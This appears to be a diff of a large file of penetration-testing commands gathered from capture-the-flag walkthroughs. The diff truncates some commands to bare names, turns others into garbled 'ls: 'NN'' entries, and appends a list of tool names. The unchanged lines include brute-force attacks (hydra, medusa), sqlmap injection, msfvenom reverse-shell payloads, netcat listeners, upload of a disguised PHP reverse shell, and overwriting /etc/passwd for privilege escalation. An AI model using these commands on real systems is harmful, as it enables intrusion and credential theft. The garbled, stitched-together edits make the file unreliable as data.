 openssl passwd -1 -salt ignite pass123
 python -m SimpleHTTPServer 80
@@ -16116,7 +16116,7 @@ cat .notes
 hydra –l veronica –P /root/Desktop/ver.txt ftp://192.168.0.103
 ftp 192.168.0.103
 dir
-swaks --to eric@madisonhotels.com --from vvaughn@polyfector.edu --server 192.168.0.104:2525 – body "My kid will be a soccer player"  --header "Subject: My kid will be soccer player"
+swaks
 aircrack-ng /root/Desktop/eg-01.cap –w /usr/share/wordlists/rockyou.txt
 nmap -p- -A 192.168.0.103
 ssh eric@192.168.0.103 –p 1974
@@ -16146,11 +16146,11 @@ dirb http://192.168.1.106/33447
 sqlmap -u 192.168.1.106:33447/bin/l33t_haxor.php?id=1 --dbs --tamper=space2comment --batch
 sqlmap -u 192.168.1.106:33447/bin/l33t_haxor.php?id=1 -D secure_login --table --tamper=space2comment
 file strcpy.exe
-foremost strcpy.exe
+foremost
 cd output
 ls
 cat audit.txt
-unrar x 00000213.rar
+unrar
 cat acid.txt
 exiftool lol.jpg
 unrar e lol.jpg
@@ -16161,7 +16161,7 @@ ssh makke@192.168.1.106
 cd /bin
 ls
 id
-ls –la
+ls: '37'
 cat flag.txt
 netdiscover
 nmap -p- -A 192.168.1.101
@@ -16179,7 +16179,7 @@ ls
 cat Flag.txt
 netdiscover
 nmap -p- -A 192.168.1.103
-ls / l
+ls: '36'
 cd /s.bin
 ls
 cat invesgitate.php
@@ -16218,16 +16218,16 @@ nc -lvp 1234
 cd /home
 ls
 cd eezpeez
-ls -la
+ls: '30'
 cat notes.txt
 echo "/home/admin/chmod –R 777 /home/admin" > /tmp/runthis
 cd /tmp
 cd /home/admin
-ls -la
+ls: '30'
 python cryptpass.py =RFn0AKnlMHMPIzpyuTI0ITG
 su fristigod
 cd /var/fristigod
-ls -lsa
+ls: '30'
 cat bash.history
 sudo -l
 sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
@@ -16295,7 +16295,7 @@ cat passwords.txt
 wpscan -u http://192.168.1.108/prehistoricforest/ --enumerate u
 wpscan -u http://192.168.1.108/prehistoricforest/ --wordlist=/usr/share/wordlists/rockyou.txt --username tom
 ssh bigtommysenior@192.168.1.108
-ls -la
+ls: '23'
 cat el-flag-numero-quatro.txt
 cp callahanbak.bak /var/www/html/index.html
 cd /var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/
@@ -16304,7 +16304,7 @@ cd uploads/
 ls
 mv php-reverse-shell.png php-reverse-shell.php
 nc –lvp 1234
-ls -la
+ls: '21'
 cat .5.txt
 unzip LOOT.zip
 cat THE-END.txt
@@ -16346,7 +16346,7 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=4444 -f raw
 python -c 'import pty;pty.spawn("/bin/bash")'
 find / -perm -u=s -type f 2>/dev/null
 cd /etc/bin
-ls -al
+ls: '19'
 wget http://192.168.1.108/passwd
 cp passwd /etc/
 su admin
@@ -16368,10 +16368,10 @@ dirb http://192.168.1.109
 curl -v -X OPTIONS http://192.168.1.109/test
 msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=443 -f raw
 cat /etc/crontab
-chkrootkit -V
+chkrootkit
 id
 cd /root
-ls -lsa
+ls: '18'
 cat 7d83aaa2bf93d8040f3f22ec6ad9d5a.txt
 netdiscover
 nmap -p- -A 192.168.1.101
@@ -16439,7 +16439,7 @@ find / -perm -u=s -type f 2>/dev/null
 nmap --interactive
 id
 cd /root
-ls -lsa
+ls: '8'
 cat key-3-of-3.txt
 netdiscover
 nmap -A 192.168.1.103
@@ -16481,7 +16481,7 @@ dirb http://192.168.1.112/content
 python -m SimpleHTTPServer 80
 print $record->name . “:” . $record->pass . “<br/>”;
 john -w=/usr/share/wordlists/rockyou.txt -form=raw-md5 /root/Desktop/users.txt
-medusa -h 192.168.1.112 -U /root/Desktop/user_list.txt -P /root/Desktop/pass.txt -M ssh
+medusa
 ls
 cat flag.txt
 ssh spinkton@192.168.1.112
@@ -16491,3 +16491,190 @@ sudo su
 ls
 cat flag.txt
 cat /etc/passwd
+
+
+Matched Lines from Reference File:
+nmap
+echo
+cat
+enum4linux
+nc
+uname
+find
+getcap
+ls
+tar
+su
+gcc
+ssh
+sudo
+john
+pkttyagent
+pkexec
+ftp
+steghide
+set
+less
+tail
+chmod
+ffuf
+export
+unzip
+zip2john
+cd
+file
+hydra
+python
+wget
+mv
+sqlmap
+git
+vi
+cp
+arp-scan
+ps
+dig
+dirb
+vim
+apt-get
+import
+fping
+pip3
+which
+openssl
+mysql
+ln
+wpscan
+crunch
+rm
+docker
+ifconfig
+strings
+base64
+wfuzz
+nano
+smbclient
+cewl
+gem
+mkdir
+ip
+timeout
+tcpdump
+perl
+if
+sh
+php
+rpcclient
+evil-winrm
+expose
+unix2dos
+searchsploit
+gunzip
+telnet
+exec
+msfvenom
+screen
+chown
+curl
+snmpwalk
+ssh-keygen
+net
+fcrackzip
+netstat
+powershell
+apt
+chisel
+smbmap
+zip
+certutil
+while
+sed
+exiftool
+hashcat
+ldapsearch
+type
+gobuster
+bash
+adb
+go
+nikto
+mount
+xfreerdp
+sqlitebrowser
+doas
+svn
+gdbus
+ss
+mysqldump
+smbpasswd
+pass
+volatility
+socat
+tmux
+tftp
+head
+locate
+cpulimit
+lsb_release
+aircrack-ng
+nohup
+scp
+stty
+stegsnow
+base32
+umask
+touch
+lftp
+apk
+kill
+nice
+run-parts
+netcat
+lxc
+msfpc
+wireshark
+for
+print
+ldd
+readelf
+from
+lynx
+host
+xxd
+gpg
+groupadd
+useradd
+drush
+mkfifo
+ncat
+bzip2
+gzip
+wc
+gdb
+r
+crontab
+clear
+7z
+ltrace
+where
+sftp
+tac
+sockstat
+vncviewer
+g++
+cc
+mawk
+grep
+fdisk
+debugfs
+more
+keepass2
+nslookup
+psql
+iptables
+fls
+swaks
+foremost
+unrar
+chkrootkit
+medusa
